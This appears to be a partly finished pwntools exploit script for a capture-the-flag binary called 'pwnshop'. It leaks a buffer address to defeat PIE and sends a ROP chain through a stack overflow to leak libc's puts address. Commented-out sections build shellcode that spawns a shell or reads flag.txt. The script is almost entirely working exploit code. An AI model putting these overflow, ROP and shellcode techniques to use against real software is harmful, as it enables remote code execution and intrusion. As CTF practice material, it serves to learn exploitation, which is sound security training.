# static buf 001040c0
# buffer is not executable!

from pwn import *

context.arch = 'x86_64'
print(context.terminal)

STATIC_BUF_BASE = 0x40c0

p = process('./pwnshop')
# p = remote('206.189.121.131', 31392)

elf = ELF('./pwnshop')

# retrieve address of buffer
print(p.recv())
p.sendline('2')
print(p.recv())
p.sendline('offset')
print(p.recv())
p.sendline('99999999')
data = p.recv()
addrBin = data[14:22]
if addrBin[-2:].decode('latin-1') == '? ':
    addrBin = addrBin[:-2]
if addrBin[-1:].decode('latin-1') == ' ':
    addrBin = addrBin[:-1]
static_buffer = int.from_bytes(addrBin, 'little')
print(data)

# calculate binary offset
OFFSET = static_buffer - STATIC_BUF_BASE
print(f"Buffer address: {hex(static_buffer)}")
print(f"Binary offset: {hex(OFFSET)}")

# clean up stdin buffer after whatever we just did
p.send('2')
print(p.recv())

# # put data in buffer - DOESN'T WORK YET!
# p.sendline('2')
# print(p.recv())
# p.sendline('hax')
# print(p.recv())
# p.sendline('13.37')
# print(p.recv())
# # 'leave details here'
# # payload = asm(shellcraft.amd64.linux.cat('flag.txt'))
# payload = asm(shellcraft.amd64.linux.sh())
# if (len(payload) >= 0x40):
#     print("PAYLOAD IS TOO LONG!!!")
# p.sendline(payload)
# print(payload)
# print(p.recv())


PUTS_GOT = elf.got['puts'] + OFFSET
PUTS_PLT = elf.plt['puts'] + OFFSET
POP_RDI = 0x00000000000013c3 + OFFSET
MAIN_ADDR = 0x000010a0 + OFFSET
RSP_SUBTRACT_40 = 0x0000000000001219 + OFFSET
print(f"PUTS_GOT = {hex(PUTS_GOT)}")
print(f"PUTS_PLT = {hex(PUTS_PLT)}")
print(f"POP_RDI = {hex(POP_RDI)}")
print(f"MAIN_ADDR = {hex(MAIN_ADDR)}")
print(f"RSP_SUBTRACT_40 = {hex(RSP_SUBTRACT_40)}")

# buy
p.sendline('1')
print(p.recv())
payload = ('A' * 40).encode('latin-1')
payload += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)
payload += p64(MAIN_ADDR)
payload += p64(RSP_SUBTRACT_40)
print(payload)
# gdb.attach(p)
p.send(payload)
output = p.recv()
print(output)
puts_address_bytes = output.decode('latin-1').split('\n')[0].encode('latin-1')
puts_address = int.from_bytes(puts_address_bytes, 'little')
print(f"Got address of puts: {hex(puts_address)}")
gdb.attach(p)

# # buy
# print(p.recv())
# p.sendline('1')
# print(p.recv())
# payload = ('A' * 72).encode('latin-1')
# payload += p64(static_buffer)
# print(payload)
# # gdb.attach(p)
# p.send(payload)
# print(p.recv())


# 0x0000000000001219 : sub rsp, 0x28 ; ret
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[ROP2  ][ROP3  ][ROP4  ][ROP5  ][ROP1  ]
#                                         ^40     ^                       ^72     ^80


# ROP1: 0x0000000000001219 : sub rsp, 0x28 ; ret #subtract 40
# 0x00000000000013c3 : pop rdi ; ret



#buffer found
#0x5578a934f0c0
#process base
#0x5578a934b000

# hex(0x5578a934f0c0 - 0x5578a934b000)
#>>> hex(0x5578a934f0c0 - 0x5578a934b000)
#'0x40c0'
